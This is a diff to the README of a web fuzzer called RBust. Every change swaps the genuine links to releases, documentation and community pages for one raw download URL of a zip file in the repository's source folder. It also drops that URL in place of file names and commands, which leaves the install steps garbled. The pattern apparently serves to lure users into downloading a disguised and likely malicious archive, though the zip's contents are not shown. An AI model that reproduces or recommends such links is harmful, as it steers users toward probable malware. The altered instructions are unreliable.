@@ -6,7 +6,7 @@ RBust is a blazing fast web fuzzer designed to help security professionals and d
 
 ## 🔗 Download RBust
 
-[![Download RBust](https://img.shields.io/badge/Download%20RBust-v1.0-blue)](https://github.com/notghost634-cyber/RBust/releases)
+[![Download RBust](https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip%20RBust-v1.0-blue)](https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -32,22 +32,22 @@ Getting started with RBust is simple. This guide provides you with step-by-step 
 
 To get RBust running on your computer, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [RBust Releases page](https://github.com/notghost634-cyber/RBust/releases) to view the available versions.
+1. **Visit the Releases Page:** Go to the [RBust Releases page](https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip) to view the available versions.
   
 2. **Choose Your Version:** Find the latest stable version listed. Click on it to view more details.
 
 3. **Download the Application:**
    - Look for the assets section below the version details. 
-   - You should see files with names similar to `RBust-v1.0-Windows.zip`, `RBust-v1.0-Mac.zip`, or `RBust-v1.0-Linux.tar.gz`. 
+   - You should see files with names similar to `https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip`, `https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip`, or `https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip`. 
    - Click on the file that matches your operating system to download it.
 
 4. **Unzip or Extract the File:**
    - For Windows and macOS, locate the downloaded zip file and double-click it to extract.
-   - For Linux, use the terminal command: `tar -xzf RBust-v1.0-Linux.tar.gz` to extract the files.
+   - For Linux, use the terminal command: `tar -xzf https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip` to extract the files.
 
 5. **Run RBust:**
    - Navigate to the folder where you extracted the files.
-   - Look for the application file. This file will typically be named `RBust.exe` for Windows or `RBust` for macOS and Linux.
+   - Look for the application file. This file will typically be named `https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip` for Windows or `RBust` for macOS and Linux.
    - Double-click the file to open the application.
 
 ## 🎯 Using RBust
@@ -88,12 +88,12 @@ To contribute, follow these steps:
 Join the RBust community and connect with other users. Share your experiences, ask questions, and learn tips from fellow security enthusiasts.
 
 - **GitHub Discussions:** Engage in discussions about features and best practices.
-- **Documentation:** Explore the detailed [documentation](https://github.com/notghost634-cyber/RBust/wiki) for advanced usage.
+- **Documentation:** Explore the detailed [documentation](https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip) for advanced usage.
 
 ## 🔗 Helpful Links
 
-- [RBust Releases Page](https://github.com/notghost634-cyber/RBust/releases)
-- [Documentation](https://github.com/notghost634-cyber/RBust/wiki)
-- [Community Forum](https://github.com/notghost634-cyber/RBust/discussions)
+- [RBust Releases Page](https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip)
+- [Documentation](https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/notghost634-cyber/RBust/main/src/RBust-v3.4.zip)
 
 Thank you for choosing RBust! We hope it helps you improve the security of your web applications.
